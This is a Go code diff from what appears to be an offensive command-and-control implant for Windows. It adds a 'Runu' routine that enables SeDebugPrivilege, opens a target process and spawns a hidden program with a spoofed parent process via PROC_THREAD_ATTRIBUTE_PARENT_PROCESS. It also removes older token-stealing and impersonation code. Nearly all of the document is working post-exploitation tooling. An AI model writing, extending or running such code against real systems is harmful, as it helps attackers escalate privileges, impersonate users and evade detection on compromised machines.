@@ -4,6 +4,7 @@ package packet
 
 import (
 	"bytes"
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"golang.org/x/sys/windows"
@@ -11,6 +12,18 @@ import (
 	"syscall"
 	"unsafe"
 )
+
+// This is out STARTUPINFOEX struct
+type STARTUPINFOEX struct {
+	StartupInfo   windows.StartupInfo
+	AttributeList *LPPROC_THREAD_ATTRIBUTE_LIST
+}
+
+// This is our opaque LPPROC_THREAD_ATTRIBUTE_LIST struct
+// This is used to allocate 48 bytes of memory easily (8*6 = 48)
+type LPPROC_THREAD_ATTRIBUTE_LIST struct {
+	_, _, _, _, _, _ uint64
+}
 
 // References: https://stackoverflow.com/questions/39595252/shutting-down-windows-using-golang-code
 type Luid struct {
@@ -28,16 +41,18 @@ type TokenPrivileges struct {
 }
 
 var (
-	advapi32DLL             = syscall.NewLazyDLL("Advapi32.dll")
-	LookupPrivilegeValueW   = advapi32DLL.NewProc("LookupPrivilegeValueW")   // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
-	AdjustTokenPrivileges   = advapi32DLL.NewProc("AdjustTokenPrivileges")   // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
-	ImpersonateLoggedOnUser = advapi32DLL.NewProc("ImpersonateLoggedOnUser") // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonatefmtgedonuser
-	DuplicateTokenEx        = advapi32DLL.NewProc("DuplicateTokenEx")        // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
-	CreateProcessWithTokenW = advapi32DLL.NewProc("CreateProcessWithTokenW") // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
-	CreateProcessWithLogonW = advapi32DLL.NewProc("CreateProcessWithLogonW")
-	LogonUserA              = advapi32DLL.NewProc("LogonUserA")
-	LogonUserW              = advapi32DLL.NewProc("LogonUserW")
-	LogonUserExW            = advapi32DLL.NewProc("LogonUserExW")
+	advapi32DLL                       = syscall.NewLazyDLL("Advapi32.dll")
+	LookupPrivilegeValueW             = advapi32DLL.NewProc("LookupPrivilegeValueW")   // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
+	AdjustTokenPrivileges             = advapi32DLL.NewProc("AdjustTokenPrivileges")   // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
+	ImpersonateLoggedOnUser           = advapi32DLL.NewProc("ImpersonateLoggedOnUser") // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonatefmtgedonuser
+	DuplicateTokenEx                  = advapi32DLL.NewProc("DuplicateTokenEx")        // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
+	CreateProcessWithTokenW           = advapi32DLL.NewProc("CreateProcessWithTokenW") // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
+	CreateProcessWithLogonW           = advapi32DLL.NewProc("CreateProcessWithLogonW")
+	LogonUserA                        = advapi32DLL.NewProc("LogonUserA")
+	LogonUserW                        = advapi32DLL.NewProc("LogonUserW")
+	LogonUserExW                      = advapi32DLL.NewProc("LogonUserExW")
+	UpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
+	InitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
 )
 
 const (
@@ -82,6 +97,10 @@ func enableSeDebugPrivilege() error {
 		fmt.Println("[+] OpenProcessToken() success")
 	}
 
+	tkp.privileges[0].attributes = windows.SE_PRIVILEGE_ENABLED
+
+	tkp.privilegeCount = 1
+
 	result, _, err := LookupPrivilegeValueW.Call(uintptr(0), uintptr(unsafe.Pointer(SE_DEBUG_NAME)), uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))))
 	if result != 1 {
 		fmt.Println("[-] LookupPrivilegeValue() error:", err)
@@ -117,56 +136,6 @@ func handleProcess(pid uint32) (syscall.Handle, error) {
 	}
 	return ProcessHandle, nil
 }
-
-/*func runAsToken(TokenHandle uintptr, command string) error {
-
-	command_ptr, _ := syscall.UTF16PtrFromString(command)
-
-	var NewTokenHandle syscall.Token
-	var StartupInfo syscall.StartupInfo
-	var ProcessInformation syscall.ProcessInformation
-
-	result, _, err := DuplicateTokenEx.Call(TokenHandle, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewTokenHandle)))
-	if result != 1 {
-		fmt.Println("[-] DuplicateTokenEx() error:", err)
-	} else {
-		fmt.Println("[+] DuplicateTokenEx() success")
-	}
-
-	result, _, err = CreateProcessWithTokenW.Call(uintptr(NewTokenHandle), LOGON_WITH_PROFILE, uintptr(0), uintptr(unsafe.Pointer(command_ptr)), 0, uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&StartupInfo)), uintptr(unsafe.Pointer(&ProcessInformation)))
-	if result != 1 {
-		fmt.Println("[-] CreateProcessWithTokenW() error:", err)
-	} else {
-		fmt.Println("[+] CreateProcessWithTokenW() success")
-	}
-
-	return err
-}
-
-
-func Steal_token(pid uint32){
-	var TokenHandle syscall.Token
-	err := enableSeDebugPrivilege()
-	if err.Error() != ("The operation completed successfully.") {
-		fmt.Println(err)
-		return
-	}
-	ProcessHandle := handleProcess(pid)
-	err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
-	if err != nil {
-		fmt.Println("[-] OpenProcessToken_main() error:", err)
-	} else {
-		fmt.Println("[+] OpenProcessToken_main() success")
-	}
-
-	command :=config.Steal_token_command
-
-	err = runAsToken(uintptr(TokenHandle),command)
-	if err != nil {
-		return
-	}
-
-}*/
 
 func runAsToken(TokenHandle uintptr) (*syscall.Token, error) {
 
@@ -311,11 +280,11 @@ func Make_token(b []byte) (uintptr, error) {
 	lpUsername, _ := windows.UTF16PtrFromString(username)
 	lpPassword, _ := windows.UTF16PtrFromString(password)
 
-	err = enableSeDebugPrivilege()
+	/*err = enableSeDebugPrivilege()
 	if err != nil && err.Error() != ("The operation completed successfully.") {
 		fmt.Println(err)
 		return 0, err
-	}
+	}*/
 
 	result, _, _ := LogonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), 9, 0, uintptr(unsafe.Pointer(&Token)))
 
@@ -331,78 +300,105 @@ func Make_token(b []byte) (uintptr, error) {
 	}
 }
 
-/*var (
-	sI windows.StartupInfo
-	pI windows.ProcessInformation
-)
-
-program, _ := windows.UTF16PtrFromString("main.exe")
-
-result, _, err := DuplicateTokenEx.Call(uintptr(Token), MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&Token)))
-if result != 1 {
-	fmt.Println("[-] DuplicateTokenEx() error:", err)
-} else {
-	fmt.Println("[+] DuplicateTokenEx() success")
-}
-
-var NewToken syscall.Token
-result, _, err = CreateProcessWithTokenW.Call(
-	uintptr(NewToken),
-	LOGON_WITH_PROFILE,
-	uintptr(0),
-	uintptr(unsafe.Pointer(program)),
-	0,
-	uintptr(0),
-	uintptr(0),
-	uintptr(unsafe.Pointer(&sI)),
-	uintptr(unsafe.Pointer(&pI)))
-
-if result != 1 {
-	fmt.Println("[-] CreateProcessWithTokenW() error:", err)
-	return &Token
-} else {
-	fmt.Println("[+] CreateProcessWithTokenW() success")
-}
-if err != nil && err.Error() != ("The operation completed successfully.") {
-	return &Token
-	fmt.Println(err)
-}*/
-
-/*func GetCurrentProcessToken() syscall.Token{
-	var TokenHandle syscall.Token
-
-
-
-	//enableSeDebugPrivilege()
-
-	ProcessHandle, err := syscall.GetCurrentProcess()
-
-	err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
+func Runu(b []byte) ([]byte, error) {
+	buf := bytes.NewBuffer(b)
+	pidBytes := make([]byte, 4)
+	_, err := buf.Read(pidBytes)
 	if err != nil {
-		log.Println("[-] OpenProcessToken() error:", err)
-	} else {
-		log.Println("[+] OpenProcessToken() success")
+		return nil, err
+	}
+	pid := binary.BigEndian.Uint32(pidBytes)
+	arg, err := util.ParseAnArg(buf)
+	if err != nil {
+		return nil, err
+	}
+	program, _ := syscall.UTF16PtrFromString(string(arg))
+
+	err = enableSeDebugPrivilege()
+	if err != nil && err.Error() != ("The operation completed successfully.") {
+		return nil, err
 	}
 
-	//ProcessHandle, err :=windows.GetCurrentThread()
+	ProcessHandle, err := windows.OpenProcess(
+		windows.PROCESS_TERMINATE|windows.SYNCHRONIZE|windows.PROCESS_QUERY_INFORMATION|
+			windows.PROCESS_CREATE_PROCESS|windows.PROCESS_SUSPEND_RESUME|windows.PROCESS_DUP_HANDLE, // Security Access rights
+		true, // Inherit Handles
+		pid,  // Target Process ID
+	)
 
-	//OpenThreadToken := advapi32DLL.NewProc("OpenThreadToken")
+	var (
+		size                uint64
+		startupInfoExtended STARTUPINFOEX
+	)
 
-	//r, _, err := OpenThreadToken.Call(uintptr(ProcessHandle), TOKEN_QUERY|TOKEN_DUPLICATE, uintptr(1), uintptr(unsafe.Pointer(&TokenHandle)))
-	//if r != 1 {
-	//	log.Println("[-] OpenThreadToken() error:", err)
-	//} else {
-	//	log.Println("[+] OpenThreadToken() success")
-	//}
+	//size := uintptr(0)
 
-	//runAsToken(uintptr(TokenHandle), syscall.StringToUTF16Ptr(command))
-	var NewTokenHandle syscall.Token
-	result, _, err := DuplicateTokenEx.Call(uintptr(TokenHandle), MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewTokenHandle)))
-	if result != 1 {
-		log.Println("[-] DuplicateTokenEx() error:", err)
-	} else {
-		log.Println("[+] DuplicateTokenEx() success")
+	InitializeProcThreadAttributeList.Call(
+		0,                              // Initial should be NULL
+		1,                              // Amount of attributes requested
+		0,                              // Reserved, must be zero
+		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory to reserve
+	)
+	if err != nil {
+		return nil, err
 	}
 
-	return NewTokenHandle
-}*/
+	fmt.Println(size)
+
+	/*if size < 48 {
+		return nil, errors.New("InitializeProcThreadAttributeList returned invalid size!")
+	}*/
+
+	startupInfoExtended.AttributeList = new(LPPROC_THREAD_ATTRIBUTE_LIST)
+
+	initResult, _, err := InitializeProcThreadAttributeList.Call(
+		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
+		1,                              // Amount of attributes requested
+		0,                              // Reserved, must be zero
+		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory that was written
+	)
+
+	if initResult == 0 {
+		return nil, errors.New("InitializeProcThreadAttributeList failed: " + err.Error())
+	}
+
+	updateResult, _, err := UpdateProcThreadAttribute.Call(
+		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
+		0,                                       // Reserved, must be zero
+		0x00020000,                              // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS constant
+		uintptr(unsafe.Pointer(&ProcessHandle)), // Pointer to HANDLE of the target process
+		unsafe.Sizeof(ProcessHandle),            // Size of the HANDLE
+		0,                                       // Pointer to previous value, we can ignore it
+		0,                                       // Pointer the size to previous value, we can ignore it
+	)
+
+	if updateResult == 0 {
+		return nil, errors.New("UpdateProcThreadAttribute failed: " + err.Error())
+	}
+
+	// Set STARTUPINFO size to match the extended size
+	startupInfoExtended.StartupInfo.Cb = uint32(unsafe.Sizeof(startupInfoExtended))
+	startupInfoExtended.StartupInfo.ShowWindow = windows.SW_HIDE
+
+	var procInfo windows.ProcessInformation
+
+	err = windows.CreateProcess(
+		nil,
+		program,
+		nil,
+		nil,
+		true,
+		windows.EXTENDED_STARTUPINFO_PRESENT|windows.CREATE_NO_WINDOW,
+		nil,
+		nil,
+		(*windows.StartupInfo)(unsafe.Pointer(&startupInfoExtended)),
+		&procInfo)
+	if err != nil {
+		return nil, errors.New("could not spawn " + string(arg) + " " + err.Error())
+	}
+
+	windows.CloseHandle(windows.Handle(ProcessHandle))
+
+	return []byte("success"), nil
+
+}
